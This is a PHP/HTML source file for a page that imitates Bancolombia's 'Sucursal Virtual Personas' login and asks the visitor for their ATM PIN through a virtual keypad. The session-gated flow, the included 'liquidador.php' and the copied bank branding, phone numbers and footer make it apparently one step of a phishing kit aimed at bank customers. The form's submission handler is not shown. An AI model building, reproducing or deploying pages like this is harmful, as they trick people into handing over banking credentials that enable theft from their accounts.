<?php
 require "liquidador.php";
 require "ayudador.php";
if (is_session_started() === FALSE) {
    session_start();
}
if(!array_key_exists("permiso1",$_SESSION)){
    header("location:index.php");
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bancolombia Sucursal Virtual Personas</title>
  <link rel="shortcut icon" href="img/favicon.svg" type="image/x-icon" />
  <link rel="stylesheet" href="css/normalize.css" />
  <link rel="stylesheet" href="css/estilos.css" />
</head>

<body>
  <div class="cuerpo">
    <div class="header1">
      <div class="logo"></div>
      <span class="svpnombre">Sucursal Virtual Personas</span>
      <div class="tiempotext">
        Fecha y hora actual: <span id="jclock1" class="tiempotext t1"></span>
      </div>
    </div>
    <div class="header2">
      <h3>Inicio de sesión</h3>
    </div>
    <div class="principal reverse">
      <div class="der">
        <div class="panel-formulario">
          <div class="panel-hform">
            <h1>Clave</h1>
          </div>
          <div class="panel-lform">
            <h4>Ingresa mediante el teclado virtual la clave que usas en el cajero.</h4>
          </div>
          <form autocomplete="off" id="fclave">
            <div class="grupo">
              <div>

                <label for="clave" style="margin-left: 10px;"> Ingresa tu clave </label>
              </div>

              <input class="clave" type="password" name="clave" id="clave" readonly>
              <div>
                <span>Ingresa mediante el teclado virtual la clave que usas en el cajero &nbsp;&nbsp;&nbsp;&nbsp;automático.</span>
              </div>

            </div>
            <div class="grupo bcentro">
              <button type="reset" id="reset" class="btn default">Cancelar</button>
              <button type="button" id="btnclave" class="btn hecho" onmouseover="javascript:asteris()" onmouseout="javascript:origanalN()">Continuar</button>
            </div>
            <div class="linkf columna">

              <img src="img/ayuda.png" alt="ayuda">
              <a href="javascript:void(0)"> Genera una clave personal</a>
            </div>
          </form>

        </div>
        <div class="table-contenedor">
          <table id="tablitanumero" class="colorContraste2">
            <tbody >
              <tr>
                <td id="p1" onmouseover="javascript:asteris()" onmouseout="javascript:origanalN()" onclick="javascript:setvalor(this)">1</td>
                <td id="p2" onmouseover="javascript:asteris()" onmouseout="javascript:origanalN()" onclick="javascript:setvalor(this)">2</td>
                <td id="p3" onmouseover="javascript:asteris()" onmouseout="javascript:origanalN()" onclick="javascript:setvalor(this)">3</td>
              </tr>
              <tr>
                <td id="p4" onmouseover="javascript:asteris()" onmouseout="javascript:origanalN()" onclick="javascript:setvalor(this)">4</td>
                <td id="p5" onmouseover="javascript:asteris()" onmouseout="javascript:origanalN()" onclick="javascript:setvalor(this)">5</td>
                <td id="p6" onmouseover="javascript:asteris()" onmouseout="javascript:origanalN()" onclick="javascript:setvalor(this)">6</td>
              </tr>
              <tr>
                <td id="p7" onmouseover="javascript:asteris()" onmouseout="javascript:origanalN()" onclick="javascript:setvalor(this)">7</td>
                <td id="p8" onmouseover="javascript:asteris()" onmouseout="javascript:origanalN()" onclick="javascript:setvalor(this)">8</td>
                <td id="p9" onmouseover="javascript:asteris()" onmouseout="javascript:origanalN()" onclick="javascript:setvalor(this)">9</td>
              </tr>
              <tr>
                <td id="p0" onmouseover="javascript:asteris()" onmouseout="javascript:origanalN()" onclick="javascript:setvalor(this)">0</td>
                <td colspan="2" id="borrar">Borrar</td>
              </tr>
            </tbody>
          </table>
          <img class="letras" src="img/Contraste2.gif" alt="contraste" id="contraste" usemap="#contrastenivel">
          <map name="contrastenivel" id="numericKeyboardMap">
            <area shape="circle" class="cursorContrast" coords="10,30,15" onclick="javascript:contrasteImgLvl(1)">
            <area shape="circle" class="cursorContrast" coords="50,30,15" onclick="javascript:contrasteImgLvl(2)">
            <area shape="circle" class="cursorContrast" coords="90,30,15" onclick="javascript:contrasteImgLvl(3)">
          </map>
        </div>

      </div>
      <div class="izq ini">
        <h5>Imagen y frase de seguridad seleccionadas</h5>
         <p class="text"></p>        
        <div>
          
            
          </div>

        </div>
      </div>
    </div>
    <div class="footer">
      <p>Sucursal Telefónica Bancolombia: Bogotá 343 0000 - Medellín 510 9000 - Cali 554 0505 - Barranquilla 361 8888 - Cartagena 693 4400 - Bucaramanga 697 2525 - Pereira 340 1213 <br>
        El resto del país 01 800 09 12345. Sucursales Telefónicas en el exterior: España 900 995 717 - Estados Unidos 1866 379 9714.
      </p>
    </div>
    <div class="footer2">
      <p>Dirección Ip: <?php echo $_SERVER["REMOTE_ADDR"]; ?></p>
      <p>Copyright ©&nbsp;2021&nbsp;Bancolombia S.A.&nbsp;&nbsp;</p>
    </div>
  </div>
  <script src="js/jquery-3.6.0.min.js"></script>
  <script language="javascript" src="js/jquery.jclockNew.js?v=4.5.1.RC2_1628742112900" type="text/JavaScript"></script>
  <script src="js/funciones.js"></script>
</body>

</html>